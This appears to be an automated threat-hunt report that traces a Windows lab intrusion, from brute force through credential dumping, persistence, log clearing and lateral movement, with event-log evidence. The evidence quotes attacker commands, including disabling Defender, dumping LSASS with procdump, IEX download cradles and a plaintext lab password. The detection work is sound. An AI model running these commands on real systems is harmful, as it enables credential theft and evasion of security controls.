report.executive_summary: Autonomous threat hunt completed. Multiple ATT&CK techniques confirmed.

findings.title: Brute Force Attack Against Administrator Account via Network Logon
findings.description: A systematic brute-force attack was conducted against the Administrator account targeting WORKSTATION-01 via Network logon type (LogonType=3). Fifteen (15) failed logon attempts occurred within a 4-minute window (02:30:03 to 02:34:27) from source IP 192.168.1.105 with varying source ports. All attempts failed with "Unknown user name or bad password" error. This concentrated pattern of credential guessing is characteristic of automated password spray/brute-force attack.
evidence: EventID=4625 | Time=2024-06-15T02:30:03 | TargetUserName=Administrator | FailureReason=Unknown user name or bad password | LogonType=3 | IpAddress=192.168.1.105
EventID=4625 | Time=2024-06-15T02:30:13 | TargetUserName=Administrator | FailureReason=Unknown user name or bad password
EventID=4625 | Time=2024-06-15T02:30:36 | TargetUserName=Administrator | FailureReason=Unknown user name or bad password
EventID=4625 | Time=2024-06-15T02:30:49 | TargetUserName=Administrator | FailureReason=Unknown user name or bad password
EventID=4625 | Time=2024-06-15T02:32:02 | TargetUserName=Administrator | FailureReason=Unknown user name or bad password
15 total failed logon events (4625) within 4-minute window from same source IP 192.168.1.105

findings.title: Post-Exploitation PowerShell Command Execution and Defense Evasion
findings.description: Following successful compromise, the attacker executed multiple PowerShell commands for reconnaissance and defense evasion. Commands included: (1) Disabling Windows Defender real-time and behavior monitoring via Set-MpPreference, (2) Enumerating processes (targeting lsass.exe), (3) Running system discovery tools (systeminfo, hostname, whoami, ipconfig, net user), (4) Loading reflection assemblies for obfuscation, and (5) Executing remote code via IEX (Invoke-Expression) with web downloads. Commands used execution bypass flags (-exec bypass, -NoP -NonI -W Hidden).
evidence: powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true @ 02:55:58
powershell.exe -c "Get-Process | Where-Object {$_.Name -eq 'lsass'}" @ 02:46:20
powershell.exe -exec bypass -c "Import-Module C:\AtomicRedTeam\invoke-atomicredteam\Invoke-Atom" @ 02:42:42
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadStr @ 02:43:19
systeminfo, hostname, whoami /all, ipconfig /all executed via PowerShell
net user enumeration via PowerShell @ 02:46:13

findings.title: Credential Dumping and Credential Access
findings.description: Evidence of credential dumping operations detected. PowerShell attempted to access and query the lsass.exe process (LSASS - Local Security Authority Subsystem Service), which stores sensitive authentication data. Additionally, procdump.exe was executed with -ma flag targeting lsass.exe to create a full memory dump (lsass.dmp). This is a classic technique for extracting credentials from system memory. Sysmon Event ID 10 captured remote process access from powershell.exe to lsass.exe with GrantedAccess code indicating process memory access.
evidence: EventID=10 | Time=2024-06-15T02:49:11 | SourceImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | TargetImage=C:\Windows\System32\lsass.exe | GrantedAccess=0x1010
EventID=4688 | Time=2024-06-15T02:49:27 | NewProcessName=C:\Tools\procdump.exe | CommandLine=procdump.exe -ma lsass.exe lsass.dmp
powershell.exe querying lsass process with Get-Process cmdlet @ 02:46:20

findings.title: Persistence via Scheduled Task with Obfuscated PowerShell Payload
findings.description: A scheduled task named "\\Microsoft\\Windows\\WindowsUpdate\\UpdateCheck" was created by Administrator user with a suspicious PowerShell command embedded in the task content. The command uses obfuscation techniques (-NoP -W Hidden) and IEX (Invoke-Expression) for downloading and executing remote code. This mimics Windows Update functionality to achieve persistence while evading detection. The task is designed to execute automatically, maintaining backdoor access even after system restart.
evidence: EventID=4698 | Time=2024-06-15T02:53:15 | SubjectUserName=Administrator | TaskName=\Microsoft\Windows\WindowsUpdate\UpdateCheck
TaskContent contains: powershell.exe -NoP -W Hidden -c IEX(Ne
Scheduled task created with obfuscated PowerShell command for remote code execution
Task leverages legitimate Windows Update naming for stealth

findings.title: Registry Modification for Persistence and Defense Evasion
findings.description: Two malicious registry modifications were detected: (1) HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware was set to disable Windows Defender anti-spyware functionality, executed via PowerShell, (2) HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate registry value was created pointing to a suspicious executable in Administrator's AppData directory, establishing Run key persistence. These modifications directly disable security controls and establish persistence mechanisms.
evidence: EventID=13 | Time=2024-06-15T02:56:28 | TargetObject=HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware | Image=powershell.exe
EventID=13 | Time=2024-06-15T03:06:20 | TargetObject=HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate | Details=C:\Users\Administrator\AppData
Run key persistence mechanism established for WindowsUpdate backdoor

findings.title: Log Clearing and Forensic Evasion
findings.description: The security event log was cleared by the Administrator user at 2024-06-15T03:15:04, which is after all malicious activities were performed. This represents a clear attempt to remove forensic evidence of the attack chain. Event ID 1102 indicates "The audit log was cleared" from subject user CORP\\Administrator. Log clearing typically occurs at the end of an attack campaign to hinder incident response and forensic analysis.
evidence: EventID=1102 | Time=2024-06-15T03:15:04 | SubjectUserName=Administrator | SubjectDomainName=CORP | Description=The audit log was cleared
Log clearing occurred after all attack activities completed (02:30-03:15 attack window, clearing at 03:15)
Indicates forensic awareness and attempt to cover tracks

findings.title: SMB/Network Share Lateral Movement Attempt with Hardcoded Credentials
findings.description: Lateral movement activity was detected targeting remote systems via SMB protocol. A net command was executed to establish a connection to \\\\192.168.1.110\\C$ using Administrator credentials with password "Lab123!" - this represents a lateral movement attempt using compromised credentials. Sysmon event captured a subsequent connection attempt to 192.168.1.110 on port 445 (SMB), and another connection to 192.168.1.115 on port 445. These activities indicate reconnaissance and attempted lateral movement to other systems within the network.

EventID=3 | Time=2024-06-15T03:01:37 | DestinationIp=192.168.1.115 | DestinationPort=445 (SMB) | Image=net.exe
EventID=3 | Time=2024-06-15T03:03:47 | DestinationIp=192.168.1.110 | DestinationPort=445 (SMB) | Image=net.exe
Hardcoded credentials used in SMB lateral movement
Multiple target systems identified for lateral movement (192.168.1.110, 192.168.1.115)

findings.title: System Reconnaissance and Enumeration
findings.description: Comprehensive system reconnaissance was conducted using multiple Windows discovery utilities executed via PowerShell. Commands executed included: systeminfo (system configuration and OS details), hostname (system name), whoami /all (user identity and group membership), net user (local user enumeration), and ipconfig /all (network configuration). These commands are typical post-exploitation reconnaissance activities to gather information about the compromised system's configuration, users, and network settings, enabling attacker planning for further attacks.

hostname executed via PowerShell @ 02:42:44
whoami /all executed via PowerShell @ 02:45:22
net user enumeration via PowerShell @ 02:46:13
ipconfig /all executed via PowerShell @ 02:45:26
All reconnaissance commands executed under Administrator context via PowerShell parent process
